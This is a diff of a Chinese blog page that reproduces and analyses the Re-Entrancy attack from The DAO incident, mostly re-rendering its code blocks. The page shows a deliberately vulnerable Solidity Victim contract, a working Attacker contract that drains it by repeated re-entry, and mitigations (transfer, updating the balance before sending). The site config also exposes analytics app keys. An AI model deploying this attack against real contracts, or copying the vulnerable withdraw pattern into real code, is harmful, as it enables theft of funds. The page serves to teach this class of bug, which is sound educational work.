@@ -67,18 +67,13 @@
 <link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
 
 
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"justloseit.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":5},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz","app_key":"x2YseXJIHmvnsM4v9y9UAlvu","server_url":"https://sni2xnrh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"ui":{"search":{"loading":"正在加载搜索索引…","prompt":"输入关键词搜索文章","error":"搜索加载失败，请重试","retry":"重新加载","empty":"没有找到匹配的文章","count":"找到 {count} 篇文章","more":"显示更多"},"copy":"复制代码","copied":"已复制","copyFailed":"复制失败，请选中代码后手动复制","tocExpand":"展开章节","tocCollapse":"收起章节"},"hostname":"justloseit.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":5},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz","app_key":"x2YseXJIHmvnsM4v9y9UAlvu","server_url":"https://sni2xnrh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -354,7 +349,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Re-Entrancy 攻击模拟——The DAO 事件复现与分析"></span>
+            <span id="subtitle">Re-Entrancy 攻击模拟——The DAO 事件复现与分析</span>
           
         </div>
 
@@ -382,7 +377,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k 字
+          3.6k 字
         
       </span>
     
@@ -393,7 +388,7 @@
         
         
         
-          33 分钟
+          31 分钟
         
       </span>
     
@@ -530,7 +525,32 @@
 <ul>
 <li>Vitcim 合约如下</li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">Victim</span>&#123;<br>    <span class="hljs-comment">//账本</span><br>    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span>=&gt;</span>uint256)public balances;<br>    <span class="hljs-comment">//查看账本</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address addr</span>)public view <span class="hljs-title function_">returns</span> (uint balance)&#123;<br>        <span class="hljs-keyword">return</span> balances[addr];<br>    &#125;<br><br>    <span class="hljs-comment">//收钱记账</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">donate</span>(<span class="hljs-params">address to</span>)public payable&#123;<br>        balances[to]+=msg.<span class="hljs-property">value</span>;<br>    &#125;<br>    <span class="hljs-comment">//提款 </span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params">uint amount</span>)public&#123;<br>        <span class="hljs-keyword">if</span>(balances[msg.<span class="hljs-property">sender</span>]&gt;=amount)&#123;<br>            <span class="hljs-comment">//关键</span><br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-property">call</span>.<span class="hljs-title function_">value</span>(amount)();<br>            balances[msg.<span class="hljs-property">sender</span>]-=amount;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//总账</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">thisBalance</span>(<span class="hljs-params"></span>)public view <span class="hljs-title function_">returns</span>(<span class="hljs-params">uint balance</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">balance</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">contract Victim{</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //账本</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    mapping</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">address</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=></span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">uint256)public balances;</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //查看账本</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> balanceOf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">address</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> addr</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> view</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> returns</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">uint</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> balance</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">){</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> balances[addr];</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //收钱记账</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> donate</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">address</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> to</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> payable</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        balances[to]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">msg.value;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //提款 </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> withdraw</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">uint</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> amount</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">)</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">        if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(balances[msg.sender]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">>=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">amount){</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">            //关键</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">            msg.sender.call.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(amount)();</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">            balances[msg.sender]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">-=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">amount;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //总账</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> thisBalance</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">()</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> view</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> returns</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">uint</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> balance</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">){</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">        return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">.balance;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre></div>
 <ul>
 <li>A 账号部署 Vitctim 合约</li>
 </ul>
@@ -554,7 +574,54 @@
 <ul>
 <li>攻击 payload 如下</li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">Attacker</span>&#123;<br>    <br>    <span class="hljs-comment">//受害地址  </span><br>    address vAddr;<br>    <br>    <span class="hljs-comment">//受害者</span><br>    <span class="hljs-title class_">Victim</span> v;<br>    <br>    <span class="hljs-comment">//拥有者地址拥有钱拥有者这</span><br>    address owner;<br>    <br>    <span class="hljs-comment">//攻击次数</span><br>    uint attackCount;<br>    <br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address addr</span>) public &#123;<br>        vAddr=addr;<br>        owner = msg.<span class="hljs-property">sender</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>)public payable&#123;<br>        attackCount=<span class="hljs-number">0</span>;<br>        v=<span class="hljs-title class_">Victim</span>(vAddr);<br>        v.<span class="hljs-property">donate</span>.<span class="hljs-title function_">value</span>(msg.<span class="hljs-property">value</span>)(<span class="hljs-variable language_">this</span>);<br>        v.<span class="hljs-title function_">withdraw</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) public payable&#123;<br>        <span class="hljs-keyword">if</span>(msg.<span class="hljs-property">sender</span>==vAddr&amp;&amp;attackCount&lt;<span class="hljs-number">10</span>)&#123;<br>            attackCount+=<span class="hljs-number">1</span>;<br>            uint sum=v.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-variable language_">this</span>);<br>            <span class="hljs-comment">//不足则全提款  </span><br>            <span class="hljs-keyword">if</span>(sum&gt;v.<span class="hljs-property">balance</span>)&#123;<br>                <span class="hljs-keyword">if</span>(v.<span class="hljs-property">balance</span>!=<span class="hljs-number">0</span>)&#123;<br>                    v.<span class="hljs-title function_">withdraw</span>(v.<span class="hljs-property">balance</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            v.<span class="hljs-title function_">withdraw</span>(sum);<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">getJackpot</span>(<span class="hljs-params"></span>)public&#123;<br>        owner.<span class="hljs-title function_">transfer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">balance</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">contract Attacker{</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //受害地址  </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    address vAddr;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //受害者</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    Victim v;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //拥有者地址拥有钱拥有者这</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    address owner;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">    //攻击次数</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    uint attackCount;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    constructor</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(address addr) public {</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        vAddr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">addr;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        owner </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> msg.sender;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> attack</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">()</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> payable</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        attackCount</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        v</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">Victim</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(vAddr);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        v.donate.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(msg.value)(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        v.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">withdraw</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> () </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> payable</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">        if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(msg.sender</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">==</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">vAddr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">&#x26;&#x26;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">attackCount</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">10</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">){</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">            attackCount</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">+=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">            uint sum</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">v.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">balanceOf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D">            //不足则全提款  </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">            if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(sum</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">></span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">v.balance){</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">                if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(v.balance</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">!=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">){</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">                    v.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">withdraw</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(v.balance);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">                }</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">                return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">            }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">            v.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">withdraw</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(sum);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">    function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> getJackpot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">()</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">public</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">        owner.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">transfer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">.balance);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre></div>
 <ul>
 <li>B 账号根据 Victim 合约地址部署 Attacker 合约</li>
 </ul>
@@ -581,15 +648,21 @@
 </li>
 <li>
 <p>将 <code>ether</code> 发送到外部合约时使用内置的 <code>transfer</code>函数。<code>transfer</code>函数仅发送 <code>2300 Gas</code> 给外部调用，这不足以使目的地址合约调用另一个合约（即重入原合约）</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">msg.<span class="hljs-property">sender</span>.<span class="hljs-property">call</span>.<span class="hljs-title function_">value</span>(amount)();<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">msg.sender.call.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(amount)();</span></span>
+<span class="line"></span></code></pre></div>
 <p>变成</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(amount);<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">msg.sender.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">transfer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(amount);</span></span>
+<span class="line"></span></code></pre></div>
 </li>
 <li>
 <p><code>Victim</code> 账户是先转钱给 <code>Attack</code> 然后修改记录，而 Re-Entrancy 攻击使得上述步骤仅仅进行到转钱而不修改记录，因此一种可行的修改方法是，先记录，再转账</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">msg.<span class="hljs-property">sender</span>.<span class="hljs-property">call</span>.<span class="hljs-title function_">value</span>(amount)();<br>balances[msg.<span class="hljs-property">sender</span>]-=amount;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="javascript"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">msg.sender.call.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">value</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(amount)();</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">balances[msg.sender]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">-=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">amount;</span></span>
+<span class="line"></span></code></pre></div>
 <p>修改成</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">balances[msg.<span class="hljs-property">sender</span>]-=amount;            <br>msg.<span class="hljs-property">sender</span>.<span class="hljs-property">call</span>.<span class="hljs-title function_">value</span>(amount)();<br></code></pre></td></tr></table></figure>
